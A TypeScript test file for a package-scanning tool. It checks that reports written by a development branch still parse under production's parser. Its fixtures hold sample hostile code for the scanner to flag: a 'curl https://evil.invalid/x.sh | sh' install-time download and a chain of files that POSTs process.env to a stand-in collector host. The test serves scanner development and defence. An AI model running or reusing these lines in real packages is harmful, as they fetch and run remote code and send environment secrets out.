// Review of 120efc2, finding 2: the branch added a signal id (`flow-stopped`) and kept the scorer name apm-score-v11.
// Production's parser checks signal ids against its own list and rejects the whole analysis for one it does not know,
// so after a rollback every report this branch wrote would lose its score and evidence, and a locally published
// version is never analysed again. Every id, reason and scorer name the branch's scorer can write must be one
// production parses: checked against tests/fixtures/production-parser.json (origin/main's lists), against origin/main
// itself when the ref is present, and by parsing real reports of this branch's scorer with origin/main's parser.
import { afterAll, describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { z } from "zod";
import production from "../../../tests/fixtures/production-parser.json";
import { analyze, CAPABILITY_IDS, COVERAGE_REASONS, SCORER, SIGNAL_IDS, SKIP_REASONS, unfinishedAnalysis, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";

const REPO = join(import.meta.dir, "../../..");
const hasMain = spawnSync("git", ["rev-parse", "--verify", "--quiet", "origin/main^{commit}"], { cwd: REPO }).status === 0;

const MANIFEST = { name: "probe-pkg", version: "1.0.0", main: "index.js", license: "MIT" };

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function analysisOf(files: Record<string, string>, extra: Partial<AnalyzeInput> = {}): Analysis {
  return analyze({ name: MANIFEST.name, manifest: MANIFEST, files: [entry("package.json", JSON.stringify(MANIFEST)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "fake", previousPublishers: [], ...extra });
}

/** reading.test.ts's budget fixture: labels multiply with every level until a file's flow reading stops at its budget. */
function flowBudget(helpers: number, levels: number) {
  const vars = Array.from({ length: helpers }, (_, i) => `v${i}`);
  const lines = ["import {spawn} from 'node:child_process';", ...vars.map((_, i) => `import {m${i}} from './m${i}.js';`)];

  lines.push(`const s0=(${vars.join(",")})=>({${vars.map((v, i) => `${v}:m${i}(${v})`).join(",")}});`);

  for (let i = 1; i < levels; i++) {
    const renamed = vars.map((v) => `${v}:w${v}`).join(",");
    const passed = vars.map((v, j) => `m${j}(${v},${vars[(j + 1) % helpers] ?? v})`).join(",");

    lines.push(`const s${i}=(${vars.join(",")})=>{const {${renamed}}=s${i - 1}(${passed});return s${i - 1}(${vars.map((v) => `w${v}`).join(",")})};`);
  }

  lines.push(`export const run=(a)=>spawn(s${levels - 1}(${vars.map(() => "a").join(",")}));`);

  return { "index.js": lines.join("\n"), ...Object.fromEntries(vars.map((_, i) => [`m${i}.js`, `export const m${i}=(a,b)=>[a,b];`])) };
}

function crossBudget(): Record<string, string> {
  const link = (i: number, n: number): string => `module.exports=[${i + 1 === n ? "process.env" : `require('./f${i + 1}.js')`}];`;

  return Object.fromEntries([["index.js", "fetch('https://collector.invalid/',{method:'POST',body:JSON.stringify(require('./f0.js'))});"], ...Array.from({ length: 300 }, (_, i) => [`f${i}.js`, link(i, 300)])]);
}

/** Reports of this branch's scorer for every way it marks an analysis unfinished, and a clean and a risky one. */
function reports(): { name: string; analysis: Analysis }[] {
  return [
    { name: "a file's flow reading at its budget", analysis: analysisOf(flowBudget(8, 5)) },
    { name: "the cross-file reading at its budget", analysis: analysisOf(crossBudget(), { maxCrossFileSteps: 50 }) },
    { name: "a parser limit", analysis: analysisOf({ "index.js": "0;".repeat(240_001) }) },
    { name: "a file past the byte budget", analysis: analysisOf({ "index.js": "module.exports = 1;\n", "big.js": `module.exports = "${"x".repeat(200)}";\n` }, { maxScannedBytes: 64 }) },
    { name: "a run the work meter stopped", analysis: unfinishedAnalysis({ name: MANIFEST.name, manifest: MANIFEST, files: [], phase: "parse", limit: 1 }) },
    { name: "an install-time download", analysis: analysisOf({ "index.js": "require('child_process').execSync('curl https://evil.invalid/x.sh | sh');\n" }) },
    { name: "a clean package", analysis: analysisOf({ "index.js": "module.exports = 1;\n" }) },
  ];
}

const Lists = z.object({ signalIds: z.array(z.string()), coverageReasons: z.array(z.string()), skipReasons: z.array(z.string()), capabilityIds: z.array(z.string()), scorer: z.string(), parsedScorers: z.array(z.string()) });

/** origin/main's packages/core/src, extracted next to this package's node_modules so its imports resolve. */
const mainDir = hasMain ? mkdtempSync(join(import.meta.dir, "../node_modules/.apm-main-core-")) : null;

afterAll(() => {
  if (mainDir !== null) rmSync(mainDir, { recursive: true, force: true });
});

/** What origin/main's own core says: its lists, and whether its parseAnalysis reads each stored report sent to it. */
const MainAnswer = z.object({ lists: Lists, parsed: z.array(z.boolean()) });

/**
 * Runs origin/main's packages/core/src, extracted into `mainDir`, in its own process: it prints its lists and parses
 * each report (the stored form, the analysis as JSON, as the registry writes it to the database).
 */
function askMain(stored: string[]): z.infer<typeof MainAnswer> {
  if (mainDir === null) throw new Error("no origin/main");
  const tar = spawnSync("sh", ["-c", 'git archive origin/main packages/core/src | tar -x -C "$1" --strip-components=2', "sh", mainDir], { cwd: REPO });

  expect(tar.status).toBe(0);
  writeFileSync(
    join(mainDir, "ask.ts"),
    [
      'import * as core from "./src/index.ts";',
      'import { CAPABILITY_IDS, COVERAGE_REASONS, parseAnalysis, SCORER, SIGNAL_IDS, SKIP_REASONS } from "./src/index.ts";',
      "const stored: string[] = JSON.parse(await Bun.stdin.text());",
      // every scorer name its parser reads: PARSED_SCORERS where it exports it (af95d58 on), else only its own
      'const parsedScorers = "PARSED_SCORERS" in core && Array.isArray(core.PARSED_SCORERS) ? core.PARSED_SCORERS : [SCORER];',
      "const lists = { signalIds: SIGNAL_IDS, coverageReasons: COVERAGE_REASONS, skipReasons: SKIP_REASONS, capabilityIds: CAPABILITY_IDS, scorer: SCORER, parsedScorers };",
      "console.log(JSON.stringify({ lists, parsed: stored.map((s) => parseAnalysis(JSON.parse(s)) !== null) }));",
    ].join("\n"),
  );
  const run = spawnSync(process.execPath, [join(mainDir, "ask.ts")], { input: JSON.stringify(stored), encoding: "utf8", timeout: 60_000 });

  expect(run.status).toBe(0);

  return MainAnswer.parse(JSON.parse(run.stdout));
}

describe("a report this branch writes parses under production's parser", () => {
  const prod = Lists.parse(production);

  test("every signal id, coverage reason, skip reason and capability id is one production knows; the scorer is its", () => {
    expect(SIGNAL_IDS.filter((id) => !prod.signalIds.includes(id))).toEqual([]);
    expect(COVERAGE_REASONS.filter((r) => !prod.coverageReasons.includes(r))).toEqual([]);
    expect(SKIP_REASONS.filter((r) => !prod.skipReasons.includes(r))).toEqual([]);
    expect(CAPABILITY_IDS.filter((c) => !prod.capabilityIds.includes(c))).toEqual([]);
    // the scorer this branch writes is one production's parser reads: its own, or a newer one it was taught first
    expect(prod.parsedScorers).toContain(SCORER);
  });

  test("the ids the scorer emits for every kind of unfinished analysis are production's", () => {
    for (const r of reports()) expect({ name: r.name, unknown: r.analysis.signals.map((s) => s.id).filter((id) => !prod.signalIds.includes(id)) }).toEqual({ name: r.name, unknown: [] });
  }, 120_000);

  test("a whole-flow stop is named in incomplete's evidence, with no signal of its own", () => {
    const [flow, cross] = reports();

    const evidenceOf = (a: Analysis | undefined): string[] => {
      const s = a?.signals.find((x) => x.id === "incomplete");

      return [...(s?.evidence ?? []), ...(s?.more ?? [])];
    };

    expect(evidenceOf(flow?.analysis)).toContain("index.js: apm could not finish tracing where values go in this file");
    expect(evidenceOf(cross?.analysis)).toContain("flows across files: apm could not finish tracing where values go between the files");
  }, 120_000);

  // skipped only where the checkout has no origin/main (CI's shallow one): the snapshot checks above still run there
  test.skipIf(!hasMain)("the snapshot is origin/main's lists, and origin/main's own parseAnalysis reads every report this branch's scorer writes", () => {
    const all = reports();
    const main = askMain(all.map((r) => JSON.stringify(r.analysis)));

    expect(main.lists).toEqual(prod);
    expect(all.map((r, i) => [r.name, main.parsed[i]])).toEqual(all.map((r) => [r.name, true]));
  }, 120_000);
});
